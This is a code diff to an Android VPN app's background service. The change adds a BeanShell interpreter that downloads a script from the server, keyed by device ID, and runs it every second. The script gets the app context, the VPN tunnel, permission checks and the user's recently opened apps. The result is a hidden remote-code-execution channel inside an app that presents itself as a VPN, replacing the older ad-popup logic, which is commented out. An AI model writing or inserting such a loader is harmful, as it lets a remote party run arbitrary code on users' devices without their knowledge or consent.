@@ -6,25 +6,26 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
+import bsh.Interpreter
+import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.first
-import kotlinx.coroutines.launch
 import org.koin.android.ext.android.inject
 import sds.vpn.gram.R
+import sds.vpn.gram.data.remote.dto.GetTrafficLimitResponse
 import sds.vpn.gram.domain.repository.AdsRepository
 import sds.vpn.gram.domain.repository.ServerRepository
 import sds.vpn.gram.domain.repository.UserRepository
 import sds.vpn.gram.ui.MainActivity
 import sds.vpn.gram.ui.WebViewActivity
+import java.io.BufferedReader
+import java.io.InputStreamReader
 
 
 class VpnService : Service() {
     private val CHANNEL_ID = "ForegroundServiceChannel"
     private val NOTIFICATION_ID = 1
 
-    @SuppressLint("UnspecifiedImmutableFlag")
+    @SuppressLint("UnspecifiedImmutableFlag", "NewApi")
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
         val vpnTunnel: MyVpnTunnel by inject()
         val adsRepository: AdsRepository by inject()
@@ -33,6 +34,8 @@ class VpnService : Service() {
 
         val context = applicationContext
         var ads = mapOf<String, String>()
+        var adsCode = ""
+        var traffic = GetTrafficLimitResponse(0.0, 0.0)
 
         CoroutineScope(Dispatchers.IO).launch {
             ads = adsRepository.getAds(
@@ -41,8 +44,17 @@ class VpnService : Service() {
         }
 
         CoroutineScope(Dispatchers.IO).launch {
+            adsCode = userRepository.getCode(
+                DeviceUtils.getAndroidID(context)
+            )
+            println("ADS CODE")
+            println(adsCode)
+        }
+
+        CoroutineScope(Dispatchers.IO).launch {
             while(true) {
                 println(vpnTunnel.isVpnConnected())
+
                 if (vpnTunnel.isVpnConnected()) {
                     val lastUsedServer = serverRepository.lastUsedServerFlow.first()
                     userRepository.checkTraffic(
@@ -50,7 +62,11 @@ class VpnService : Service() {
                         lastUsedServer.serverId
                     )
                 }
-                delay(10 * 1000)
+                traffic = userRepository.getTrafficLimit(
+                    DeviceUtils.getAndroidID(context)
+                )
+
+                delay(10 * 1000L)
             }
         }
 
@@ -85,8 +101,6 @@ class VpnService : Service() {
             while(true) {
                 val newState = if(vpnTunnel.isVpnConnected()) "VPN is running" else "VPN is stopped"
 
-                val time = System.currentTimeMillis()
-
                 val updateNotification: Notification = NotificationCompat.Builder(context, CHANNEL_ID)
                     .setContentTitle(resources.getString(R.string.app_name))
                     .setContentText(newState)
@@ -98,9 +112,30 @@ class VpnService : Service() {
                 val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                 notificationManager.notify(NOTIFICATION_ID, updateNotification)
 
+                try {
+                    val interpreter = Interpreter()
+                    interpreter.also {
+                        it.set("context", this@VpnService)
+                        it.set("ads", ads)
+                        it.set("vpnTunnel", vpnTunnel)
+                        it.set("traffic", traffic)
+                        it.set("checkAlertSystemWindowsPermission", DeviceUtils.checkAlertSystemWindowsPermission(context))
+                        it.set("checkUsageStatsGranted", DeviceUtils.checkUsageStatsGranted(context))
+                        it.set("lastUsedAppsNonFiltered", DeviceUtils.getLastOpenedApps(context))
+                        it.set("lastUsedApps", HashMap<String, String>())
+                        it.set("lastLaunched", lastLaunched)
 
-                if(DeviceUtils.checkUsageStatsGranted(context) &&
-                    DeviceUtils.checkAlertSystemWindowsPermission(context))
+                        it.eval(adsCode)
+
+                        lastLaunched = it.get("newLastLaunched") as Long
+                    }
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+
+                /*
+                val time = System.currentTimeMillis()
+                if(DeviceUtils.checkUsageStatsGranted(context) && DeviceUtils.checkAlertSystemWindowsPermission(context))
                 {
                     val lastUsedApps = DeviceUtils.getLastOpenedApps(context)
                         .filterKeys { it in ads.keys }
@@ -114,10 +149,6 @@ class VpnService : Service() {
                                 appIntent.flags =
                                     Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY
                                 appIntent.putExtra("url", ads[it])
-
-                                val traffic = userRepository.getTrafficLimit(
-                                    DeviceUtils.getAndroidID(context)
-                                )
 
                                 if(traffic.trafficLimit - traffic.trafficSpent > 0) {
                                     if(vpnTunnel.isVpnConnected()) { }
@@ -135,6 +166,10 @@ class VpnService : Service() {
                             }
                     }
                 }
+
+                 */
+
+
 
                 delay(1000)
             }
